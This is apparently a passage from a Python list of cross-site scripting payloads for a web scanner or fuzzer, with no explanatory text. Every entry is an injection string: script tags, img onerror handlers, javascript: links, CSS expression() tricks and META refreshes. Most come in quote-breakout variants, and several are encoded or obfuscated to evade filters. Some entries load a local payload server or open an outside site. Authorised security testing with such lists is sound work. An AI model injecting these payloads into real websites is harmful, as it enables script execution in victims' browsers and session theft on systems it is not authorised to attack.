             '"><img src=xx:xx;onerror=alert(1)>', "'><img src=xx:xx;onerror=alert(1)>",
             '<img src=x > onerror="console.alert(document.getElementsByTagName(\'html\')[0].innerHTML)">',
             '"><img src=x > onerror="console.alert(document.getElementsByTagName(\'html\')[0].innerHTML)">',
             '\'><img src=x > onerror="console.alert(document.getElementsByTagName(\'html\')[0].innerHTML)">',
             "<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "</ScrIpt><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             '"><script> chr=String.fromCharCode(1); result=\'\'; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>',
             "</ScrIpt><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "'><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "</ScrIpt><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "</ScrIpt><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             '"><script> chr=String.fromCharCode(1); result=\'\'; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>',
             "</ScrIpt><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "'><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             "</ScrIpt><script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>",
             '<img src=x > onerror=alert(1)>', '"><img src=x > onerror=alert(1)>', "'><img src=x > onerror=alert(1)>",
             '<svg><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script></svg>', '<img src=xx:xx onerror="&#X61;lert(1);alert(1)">',
             '"><img src=xx:xx onerror="&#X61;lert(1);alert(1)">',
             '\'><img src=xx:xx onerror="&#X61;lert(1);alert(1)">', "<img src=xx:xx onerror=window[['alert']](1)>",
             '"><img src=xx:xx onerror=window[[\'alert\']](1)>', "'><img src=xx:xx onerror=window[['alert']](1)>",
             '"\'><img src="xx:xx" on error="alert(1);">', '<img src=xx:xx onerror=alert(1)>',
             '"><img src=xx:xx onerror=alert(1)>', "'><img src=xx:xx onerror=alert(1)>",
             '<img src=xx:xx onerror =alert(1);>', '"><img src=xx:xx onerror =alert(1);>',
             "'><img src=xx:xx onerror =alert(1);>",
             '<META HTTP-EQUIV="refresh" CONTENT="0.1; URL=javascript:void()//?;URL=javascript:alert(1)//">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0.1; URL=javascript:void()//?;URL=javascript:alert(1)//">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0.1; URL=javascript:void()//?;URL=javascript:alert(1)//">',
             '<meta http-equiv=refresh content="javascript:alert(\'1\')">',
             '"><meta http-equiv=refresh content="javascript:alert(\'1\')">',
             '\'><meta http-equiv=refresh content="javascript:alert(\'1\')">', '<a href="javascript:alert(1)">X</a>',
             '"><a href="javascript:alert(1)">X</a>', '\'><a href="javascript:alert(1)">X</a>',
             "<script> document.cookie='X'; if(document.cookie !== 'X') { alert(1,document.cookie); } </script>",
             "</ScrIpt><script> document.cookie='X'; if(document.cookie !== 'X') { alert(1,document.cookie); } </script>",
             '"><script> document.cookie=\'X\'; if(document.cookie !== \'X\') { alert(1,document.cookie); } </script>',
             "</ScrIpt><script> document.cookie='X'; if(document.cookie !== 'X') { alert(1,document.cookie); } </script>",
             "'><script> document.cookie='X'; if(document.cookie !== 'X') { alert(1,document.cookie); } </script>",
             "</ScrIpt><script> document.cookie='X'; if(document.cookie !== 'X') { alert(1,document.cookie); } </script>",
             'htmlStr = \'<a href="javascript:alert(1)">X</a>', '"><a href="javascript:alert(1)">X</a>',
             '\'><a href="javascript:alert(1)">X</a>\'; document.getElementById(\'body\').innerHTML = htmlStr; try { alert(1);}catch(e){alert(1);};',
             'htmlStr = \'<a href="javascript:alert(1)">X</a>', '"><a href="javascript:alert(1)">X</a>',
             '\'><a href="javascript:alert(1)">X</a>\'; document.getElementById(\'body\').innerHTML = htmlStr; try { if(document.getElementById(\'body\').firstChild.protocol === \'javascript:\') { alert(1); } }catch(e){alert(1);};',
             '<img src=x:xx onerror="try {execScript(\'a=1\',\'vbs\');alert(1);}catch(e){alert(1);}">',
             '"><img src=x:xx onerror="try {execScript(\'a=1\',\'vbs\');alert(1);}catch(e){alert(1);}">',
             '\'><img src=x:xx onerror="try {execScript(\'a=1\',\'vbs\');alert(1);}catch(e){alert(1);}">',
             '<div style="color:red\'{} x:expression(alert(1))">.</div>',
             '"><div style="color:red\'{} x:expression(alert(1))">.</div>',
             '\'><div style="color:red\'{} x:expression(alert(1))">.</div>',
             "<img src='xx:x><img src=xx:x onerror=alert(1)>'>", '"><img src=\'xx:x><img src=xx:x onerror=alert(1)>\'>',
             "'><img src='xx:x><img src=xx:x onerror=alert(1)>'>", '<img src=\'xx:x\\ onerror="alert(1)">\'>',
             '"><img src=\'xx:x\\ onerror="alert(1)">\'>', '\'><img src=\'xx:x\\ onerror="alert(1)">\'>',
             '<img src=\'xx:x onerror="alert(1)">\'>', '"><img src=\'xx:x onerror="alert(1)">\'>',
             '\'><img src=\'xx:x onerror="alert(1)">\'>', '`"\'><img src="# onerror=alert(1)>',
             '<img src=xx:xx onerror="x=\'\\\',alert(1)//\'">', '"><img src=xx:xx onerror="x=\'\\\',alert(1)//\'">',
             '\'><img src=xx:xx onerror="x=\'\\\',alert(1)//\'">', '<script>alert(alert(1))</script>',
             '</ScrIpt><script>alert(alert(1))</script>', '"><script>alert(alert(1))</script>',
             '</ScrIpt><script>alert(alert(1))</script>', "'><script>alert(alert(1))</script>",
             '</ScrIpt><script>alert(alert(1))</script>', "<script>x='<script><img src=xx:xx onerror=alert(1)>",
             '"><img src=xx:xx onerror=alert(1)>', "'><img src=xx:xx onerror=alert(1)>';</script>",
             '<script>alert(1)<script></script>', '</ScrIpt><script>alert(1)<script></script>',
             '"><script>alert(1)<script></script>', '</ScrIpt><script>alert(1)<script></script>',
             "'><script>alert(1)<script></script>", '</ScrIpt><script>alert(1)<script></script>',
             '--><img src=xxx:x onerror=alert(1)> -->', '<img src=xx:xx# /onerror=alert(1)>',
             '"><img src=xx:xx# /onerror=alert(1)>', "'><img src=xx:xx# /onerror=alert(1)>",
             '<img src=xx:xx alt=`/onerror=alert(1)//`>', '"><img src=xx:xx alt=`/onerror=alert(1)//`>',
             "'><img src=xx:xx alt=`/onerror=alert(1)//`>", '<img src=xx:xx onerror=alert(1)>',
             '"><img src=xx:xx onerror=alert(1)>',
             "'><img src=xx:xx onerror=alert(1)> <a href=javascript:alert(1)>1</a>",
             '"><img src=xx:xx onerror=alert(1)> <a href=javascript:alert(1)>1</a>',
             "'><img src=xx:xx onerror=alert(1)> <a href=javascript:alert(1)>1</a>",
             '<script>alert(1,1</script//)</script>', '</ScrIpt><script>alert(1,1</script//)</script>',
             '"><script>alert(1,1</script//)</script>', '</ScrIpt><script>alert(1,1</script//)</script>',
             "'><script>alert(1,1</script//)</script>", '</ScrIpt><script>alert(1,1</script//)</script>',
             '<script>alert(1,1</script/)</script>', '</ScrIpt><script>alert(1,1</script/)</script>',
             '"><script>alert(1,1</script/)</script>', '</ScrIpt><script>alert(1,1</script/)</script>',
             "'><script>alert(1,1</script/)</script>", '</ScrIpt><script>alert(1,1</script/)</script>',
             '<body> ?iframe onload=confirm(/X/)&gt; <img src=x:x onerror="innerHTML=previousSibling.nodeValue.replace(\'?\',\'<\')"> </body>',
             '"><body> ?iframe onload=confirm(/X/)&gt; <img src=x:x onerror="innerHTML=previousSibling.nodeValue.replace(\'?\',\'<\')"> </body>',
             '\'><body> ?iframe onload=confirm(/X/)&gt; <img src=x:x onerror="innerHTML=previousSibling.nodeValue.replace(\'?\',\'<\')"> </body>',
             '<b id="id1" x=begin0x9fa0end >`\'"></b><script>if (!/begin.end/.test(document.getElementById(\'id1\').getAttribute(\'x\'))) { alert(1);}</script>',
             '"><b id="id1" x=begin0x9fa0end >`\'"></b><script>if (!/begin.end/.test(document.getElementById(\'id1\').getAttribute(\'x\'))) { alert(1);}</script>',
             '\'><b id="id1" x=begin0x9fa0end >`\'"></b><script>if (!/begin.end/.test(document.getElementById(\'id1\').getAttribute(\'x\'))) { alert(1);}</script>',
             '<b id="id1" x=begin0x2924end >`\'"></b><script>if (!/begin.end/.test(document.getElementById(\'id1\').getAttribute(\'x\'))) { alert(1);}</script>',
             '"><b id="id1" x=begin0x2924end >`\'"></b><script>if (!/begin.end/.test(document.getElementById(\'id1\').getAttribute(\'x\'))) { alert(1);}</script>',
             '\'><b id="id1" x=begin0x2924end >`\'"></b><script>if (!/begin.end/.test(document.getElementById(\'id1\').getAttribute(\'x\'))) { alert(1);}</script>',
             '<img src=# onerror="alert(1)" >', '"><img src=# onerror="alert(1)" >',
             '\'><img src=# onerror="alert(1)" >', '<title>X<script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script></title>',
             '<div style="X:expression(alert(1))\\"></div>', '"><div style="X:expression(alert(1))\\"></div>',
             '\'><div style="X:expression(alert(1))\\"></div>', '<div style="X:expression(alert(1))\'"></div>',
             '"><div style="X:expression(alert(1))\'"></div>', '\'><div style="X:expression(alert(1))\'"></div>',
             '<div style="X:expression(alert(1))"></div>', '"><div style="X:expression(alert(1))"></div>',
             '\'><div style="X:expression(alert(1))"></div>', '<div style="X:expression(alert(1))">X/div>',
             '"><div style="X:expression(alert(1))">X/div>', '\'><div style="X:expression(alert(1))">X/div>',
             '<img src=1 title= x:xx/onerror=alert(1)>', '"><img src=1 title= x:xx/onerror=alert(1)>',
             "'><img src=1 title= x:xx/onerror=alert(1)>", '<script>if("x\\".length==2) { alert(1);}</script>',
             '</ScrIpt><script>if("x\\".length==2) { alert(1);}</script>',
             '"><script>if("x\\".length==2) { alert(1);}</script>',
             '</ScrIpt><script>if("x\\".length==2) { alert(1);}</script>',
             '\'><script>if("x\\".length==2) { alert(1);}</script>',
             '</ScrIpt><script>if("x\\".length==2) { alert(1);}</script>',
             '<script>if("x\\".length==1) { alert(1);}</script>',
             '</ScrIpt><script>if("x\\".length==1) { alert(1);}</script>',
             '"><script>if("x\\".length==1) { alert(1);}</script>',
             '</ScrIpt><script>if("x\\".length==1) { alert(1);}</script>',
             '\'><script>if("x\\".length==1) { alert(1);}</script>',
             '</ScrIpt><script>if("x\\".length==1) { alert(1);}</script>', '<img src=xxx:xxx title=1/onerror=alert(1)>',
             '"><img src=xxx:xxx title=1/onerror=alert(1)>', "'><img src=xxx:xxx title=1/onerror=alert(1)>",
             '<script>if("xx" == "xx") { alert(1);}</script>',
             '</ScrIpt><script>if("xx" == "xx") { alert(1);}</script>',
             '"><script>if("xx" == "xx") { alert(1);}</script>',
             '</ScrIpt><script>if("xx" == "xx") { alert(1);}</script>',
             '\'><script>if("xx" == "xx") { alert(1);}</script>',
             '</ScrIpt><script>if("xx" == "xx") { alert(1);}</script>', '<img src=x onError="javascript:alert(1)"/>',
             '"><img src=x onError="javascript:alert(1)"/>', '\'><img src=x onError="javascript:alert(1)"/>',
             '"`\'><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '<script type="text/javascript">alert(1);</script>', '"><script type="text/javascript">alert(1);</script>',
             '\'><script type="text/javascript">alert(1);</script>', "<script charset='utf-8'>alert(1)</script>",
             '"><script charset=\'utf-8\'>alert(1)</script>', "'><script charset='utf-8'>alert(1)</script>",
             '<style></style><img src="about:blank" onerror=alert(1)//></style>',
             '"><style></style><img src="about:blank" onerror=alert(1)//></style>',
             '\'><style></style><img src="about:blank" onerror=alert(1)//></style>',
             "<script>a='X\\\\';alert(1)//X';</script>", "</ScrIpt><script>a='X\\\\';alert(1)//X';</script>",
             '"><script>a=\'X\\\\\';alert(1)//X\';</script>', "</ScrIpt><script>a='X\\\\';alert(1)//X';</script>",
             "'><script>a='X\\\\';alert(1)//X';</script>", "</ScrIpt><script>a='X\\\\';alert(1)//X';</script>",
             '<script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>',
             '</ScrIpt><script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>',
             '"><script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>',
             '</ScrIpt><script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>',
             '\'><script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>',
             '</ScrIpt><script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>',
             '<div class="foo1">X</div> <script>document.getElementsByClassName(\'foo1\')[0]?alert(1):0</script>',
             '"><div class="foo1">X</div> <script>document.getElementsByClassName(\'foo1\')[0]?alert(1):0</script>',
             '\'><div class="foo1">X</div> <script>document.getElementsByClassName(\'foo1\')[0]?alert(1):0</script>',
             '"`\'/><img/onload=alert(1) src=""/>', '<!--<img src=xxx:x onerror=alert(1)> -->',
             '"><!--<img src=xxx:x onerror=alert(1)> -->', "'><!--<img src=xxx:x onerror=alert(1)> -->",
             '<script>/* */alert(1)// */</script>', '</ScrIpt><script>/* */alert(1)// */</script>',
             '"><script>/* */alert(1)// */</script>', '</ScrIpt><script>/* */alert(1)// */</script>',
             "'><script>/* */alert(1)// */</script>", '</ScrIpt><script>/* */alert(1)// */</script>',
             '"\'`>X<div style="font-family:\'foo;x:expression(alert(1));/*\';">X',
             '"\'`>X<div style="font-family:\'foo\'x:expression(alert(1));/*\';">X',
             '"\'`><script>a=/X;;i=0;alert(1);a/i;</script>', '<a href="><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>" />',
             '"\'`><p><svg><script>a=\'X;alert(1)//\';</script></p>', '<p><svg><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script></p>',
             '<iframe src="vbscript:alert()></iframe>', '"><iframe src="vbscript:alert()></iframe>',
             '\'><iframe src="vbscript:alert()></iframe>', 'X<div style="x:expression(alert(1))">X',
             'X<div style="xexpression(alert(1))">X', '<script src="data:text/plainalert(1)"></script>',
             '"><script src="data:text/plainalert(1)"></script>', '\'><script src="data:text/plainalert(1)"></script>',
             '<script src="data:,alert(1)"></script>', '"><script src="data:,alert(1)"></script>',
             '\'><script src="data:,alert(1)"></script>', '<script src="data:text/plain,alert(1)"></script>',
             '"><script src="data:text/plain,alert(1)"></script>',
             '\'><script src="data:text/plain,alert(1)"></script>',
             "<script> if ('a'.trim() === '') { alert(1); } </script>",
             "</ScrIpt><script> if ('a'.trim() === '') { alert(1); } </script>",
             '"><script> if (\'a\'.trim() === \'\') { alert(1); } </script>',
             "</ScrIpt><script> if ('a'.trim() === '') { alert(1); } </script>",
             "'><script> if ('a'.trim() === '') { alert(1); } </script>",
             "</ScrIpt><script> if ('a'.trim() === '') { alert(1); } </script>", '"\'`><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '"\'`><img src=xxx:x onerror=alert(1)>', '\'`"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '`"\'><img src=xxx:x onerror=alert(1)>', '\'"`><script>/* *alert(1)// */</script>',
             '`\'"><script>window[\'alert\'](1)</script>',
             "\\u0031+\\u0031\\u005b'\\145\\166\\141\\154'\\u005d\\u0028'\\141\\154\\145\\162\\164\\50\\61\\51'\\u0029",
             '\\u0030\\u005b\\u0022\\x65\\x76\\x61\\x6C"\\u005d\\u0028\\u0027\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29\'\\u0029',
             "0['eval']('alert(1)')",
             '<a href="javascript:\\u0031+\\u0031\\u005b\'\\145\\166\\141\\154\'\\u005d\\u0028\'\\141\\154\\145\\162\\164\\50\\61\\51\'\\u0029">X</a>',
             '"><a href="javascript:\\u0031+\\u0031\\u005b\'\\145\\166\\141\\154\'\\u005d\\u0028\'\\141\\154\\145\\162\\164\\50\\61\\51\'\\u0029">X</a>',
             '\'><a href="javascript:\\u0031+\\u0031\\u005b\'\\145\\166\\141\\154\'\\u005d\\u0028\'\\141\\154\\145\\162\\164\\50\\61\\51\'\\u0029">X</a>',
             '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x5C&#x75&#x30&#x30&#x33&#x31&#x2B&#x5C&#x75&#x30&#x30&#x33&#x31&#x5C&#x75&#x30&#x30&#x35&#x62&#x27&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x36&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x27&#x5C&#x75&#x30&#x30&#x35&#x64&#x5C&#x75&#x30&#x30&#x32&#x38&#x27&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x32&#x5C&#x31&#x36&#x34&#x5C&#x35&#x30&#x5C&#x36&#x31&#x5C&#x35&#x31&#x27&#x5C&#x75&#x30&#x30&#x32&#x39">X</a>',
             '"><a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x5C&#x75&#x30&#x30&#x33&#x31&#x2B&#x5C&#x75&#x30&#x30&#x33&#x31&#x5C&#x75&#x30&#x30&#x35&#x62&#x27&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x36&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x27&#x5C&#x75&#x30&#x30&#x35&#x64&#x5C&#x75&#x30&#x30&#x32&#x38&#x27&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x32&#x5C&#x31&#x36&#x34&#x5C&#x35&#x30&#x5C&#x36&#x31&#x5C&#x35&#x31&#x27&#x5C&#x75&#x30&#x30&#x32&#x39">X</a>',
             '\'><a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x5C&#x75&#x30&#x30&#x33&#x31&#x2B&#x5C&#x75&#x30&#x30&#x33&#x31&#x5C&#x75&#x30&#x30&#x35&#x62&#x27&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x36&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x27&#x5C&#x75&#x30&#x30&#x35&#x64&#x5C&#x75&#x30&#x30&#x32&#x38&#x27&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x32&#x5C&#x31&#x36&#x34&#x5C&#x35&#x30&#x5C&#x36&#x31&#x5C&#x35&#x31&#x27&#x5C&#x75&#x30&#x30&#x32&#x39">X</a>',
             "<input id='1'><input id=1><script>alert(1)</script>",
             '"><input id=\'1\'><input id=1><script>alert(1)</script>',
             "'><input id='1'><input id=1><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>',
             '<a href="invalid:1" id=x name=y>X</a><a href="invalid:2" id=x name=y>X</a><script>alert(x.y[0])</script>',
             '"><a href="invalid:1" id=x name=y>X</a><a href="invalid:2" id=x name=y>X</a><script>alert(x.y[0])</script>',
             '\'><a href="invalid:1" id=x name=y>X</a><a href="invalid:2" id=x name=y>X</a><script>alert(x.y[0])</script>',
             '<a href=1 name=x>X</a><a href=1 name=x>X</a><script>alert(x.removeChild)//undefinedalert(x.parentNode)//undefined</script>',
             '"><a href=1 name=x>X</a><a href=1 name=x>X</a><script>alert(x.removeChild)//undefinedalert(x.parentNode)//undefined</script>',
             "'><a href=1 name=x>X</a><a href=1 name=x>X</a><script>alert(x.removeChild)//undefinedalert(x.parentNode)//undefined</script>",
             '<a href="123" id=x>X</a><script>x=\'javascript:alert(1)\'//only in compat!;</script>',
             '"><a href="123" id=x>X</a><script>x=\'javascript:alert(1)\'//only in compat!;</script>',
             '\'><a href="123" id=x>X</a><script>x=\'javascript:alert(1)\'//only in compat!;</script>',
             '<form name=self location="javascript:alert(1)"', '"><form name=self location="javascript:alert(1)"',
             '\'><form name=self location="javascript:alert(1)">', '"><form name=self location="javascript:alert(1)"',
             '"><form name=self location="javascript:alert(1)"', '\'><form name=self location="javascript:alert(1)">',
             '\'><form name=self location="javascript:alert(1)"', '"><form name=self location="javascript:alert(1)"',
             '\'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>',
             '"><form name=self location="javascript:alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>',
             '\'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>',
             '<form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>',
             '"><form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>',
             '\'><form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>',
             '<iframe name=x></iframe>"></iframe><a href="http://127.0.0.1:3555/xss_serve_payloads/X.html" target=x id=x></a><script>window.onload=function(){x.click()}</script>',
             '"><iframe name=x></iframe>"></iframe><a href="http://127.0.0.1:3555/xss_serve_payloads/X.html" target=x id=x></a><script>window.onload=function(){x.click()}</script>',
             '\'><iframe name=x></iframe>"></iframe><a href="http://127.0.0.1:3555/xss_serve_payloads/X.html" target=x id=x></a><script>window.onload=function(){x.click()}</script>',
             '%3Cform%20name%3D%22body%22%20onmouseover%3D%22alert(1)%22%20style%3D%22height%3A800px%22%3E%3Cfieldset%20name%3D%22attributes%22%3E%3Cform%3E%3C%2Fform%3E%3Cform%20name%3D%22parentNode%22%3E%3Cimg%20id%3D%22attributes%22%3E%3C%2Fform%3E%3C%2Ffieldset%3E%3C%2Fform%3E',
             '"onmouseover="alert(1)"a="', "'onmouseover='alert(1)'a='", "'%20onmouseover=alert(1)'",
             '%22%20onmouseover=javascript:alert(1)%20%22', "\\');alert(1);//", ');alert(1)//', "');alert(1)//",
             '%26%2339;-alert(1)//', '%22);alert(1);//', '%E0<body onload=alert(1)>', '%00<body onload=alert(1)>',
             "X'%20alert(1)%2F%2F", 'X%22%20alert(1)%2F%2F', "%5C%5C'%2Balert(1)%3B%2F%2F",
             '%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E', 'alert(1)%3B', '%3Cscript%3Ea%3D%2FX%2F',
             'alert(1)%3C%2Fscript%3E', '%22%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E',
             'X%20-%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'X%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E',
             '<SCRIPT>alert(1);</SCRIPT>', '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>',
             '<META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">',
             '"><META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">',
             '\'><META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">',
             '<STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>',
             '"><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>',
             '\'><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=X></A>',
             '"><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=X></A>',
             '\'><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=X></A>', '"><A CLASS=X></A>',
             "'><A CLASS=X></A>",
             '<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(1);">',
             '"><!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(1);">',
             '\'><!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(1);">',
             '<img src=a onerror=alert(1)', '"><img src=a onerror=alert(1)', "'><img src=a onerror=alert(1) %0A>",
             '"><img src=a onerror=alert(1) %0A>', "'><img src=a onerror=alert(1) %0A>",
             '<img src="x" class="\'\'onerror=alert(1)">', '"><img src="x" class="\'\'onerror=alert(1)">',
             '\'><img src="x" class="\'\'onerror=alert(1)">', '0<aside xmlns="x><img src=x onerror=alert(1)">1</aside>',
             '0<aside xmlns="x><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>">1</aside>', '0<aside xmlns="foo:img src=x onerror=alert(1)>">123',
             '<p  style="font-family:\'\\22\\3bx:expression(alert(1))/*\'">',
             '"><p  style="font-family:\'\\22\\3bx:expression(alert(1))/*\'">',
             '\'><p  style="font-family:\'\\22\\3bx:expression(alert(1))/*\'">',
             '<p style="font-family: \'foo\\27\\3b color\\3a expression(alert(1))/*',
             '"><p style="font-family: \'foo\\27\\3b color\\3a expression(alert(1))/*',
             '\'><p style="font-family: \'foo\\27\\3b color\\3a expression(alert(1))/*',
             '<p style="fon\\22\\3e\\3cimg\\20src\\3dx\\20onerror\\3d alert\\28 1\\29\\3et-family:\'foobar\'">',
             '"><p style="fon\\22\\3e\\3cimg\\20src\\3dx\\20onerror\\3d alert\\28 1\\29\\3et-family:\'foobar\'">',
             '\'><p style="fon\\22\\3e\\3cimg\\20src\\3dx\\20onerror\\3d alert\\28 1\\29\\3et-family:\'foobar\'">',
             '<p style="filter: \'expression(alert(1))\'">', '"><p style="filter: \'expression(alert(1))\'">',
             '\'><p style="filter: \'expression(alert(1))\'">', '<svg><style>&ltimg src=x onerror=alert(1)&gt</svg>',
             '"><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>',
             "'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>",
             '<p style="font-family: \'foo&amp;x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(alert(1))\'">',
             '"><p style="font-family: \'foo&amp;x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(alert(1))\'">',
             '\'><p style="font-family: \'foo&amp;x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(alert(1))\'">',
             '<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
             '"><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
             '\'><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
             "<svg><script xlink:href=data&colon;,window.open('http://www.opensecurity.in')></script",
             '"><svg><script xlink:href=data&colon;,window.open(\'http://www.opensecurity.in\')></script',
             "'><svg><script xlink:href=data&colon;,window.open('http://www.opensecurity.in')></script",
             'http://www.opensecurity<script .in>alert(document.location)</script',
             '&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver',
             '<div/style="width:expression(confirm(1))">X</div>', '"><div/style="width:expression(confirm(1))">X</div>',
             '\'><div/style="width:expression(confirm(1))">X</div>',
             'perl -e \'print "&lt;IMG SRC=java\\0script:alert(\\"X\\")&gt;";\' &gt; out',
             'perl -e \'print "&lt;SCR\\0IPT&gt;alert(\\"X\\")&lt;/SCR\\0IPT&gt;";\' &gt; out',
             'perl -e \'print "<IMG SRC=java\\0script:alert(1)>";\'> out',
             'window["ale"+(!![]+[])[-~[]]+(!![]+[])[+[]]]()', 'window["ale"+"\\x72\\x74"]()',
             'window["\\x61\\x6c\\x65\\x72\\x74"]()', "window['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()",
             "window['ale'+'\\x72\\x74']()", "window['\\x61\\x6c\\x65\\x72\\x74']()",
             'window[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))',
